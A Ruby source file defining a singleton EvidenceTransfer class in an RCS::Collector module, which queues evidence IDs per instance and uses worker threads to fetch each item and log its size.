#
#  Evidence Transfer module for transferring evidence to the db
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence_manager'
require 'rcs-common/flatsingleton'
require 'rcs-common/fixnum'

# from system
require 'thread'

module RCS
module Collector

class EvidenceTransfer
  include Singleton
  extend FlatSingleton
  include RCS::Tracer

  def initialize
    @evidences = {}
    @worker = Thread.new { self.work }
    # the mutex to avoid race conditions
    @semaphore = Mutex.new
  end

  def send_cached
    trace :info, "Transferring cached evidence to the db..."

    # for every instance, get all the cached evidence and send them
    EvidenceManager.instances.each do |instance|
      EvidenceManager.evidence_ids(instance).each do |id|
        self.notify instance, id
      end
    end

  end

  def notify(instance, id)
    # add the id to the queue
    @semaphore.synchronize do
      @evidences[instance] ||= []
      @evidences[instance] << id
    end
    # wake up the worker
    @worker.run
  end

  def work
    # infinite loop for working
    loop do
      # pass the control to other threads,
      # but check for evidence every second if any notify was lost in the notify-race
      sleep 1

      # keep an eye on race conditions...
      # copy the value and don't keep the resource locked too long
      instances = @semaphore.synchronize { @evidences.each_key.to_a }

      # for each instance get the ids we have and send them
      instances.each do |instance|
        # one thread per instance
        Thread.new do
          while (id = @evidences[instance].shift)
            self.transfer instance, id
          end
          Thread.exit
        end
      end
    end
  end

  def transfer(instance, id)
    evidence = EvidenceManager.get_evidence(id, instance)
    trace :debug, "Transferring [#{instance}] #{evidence.size.to_s_bytes}"
  end

end
  
end #Collector::
end #RCS::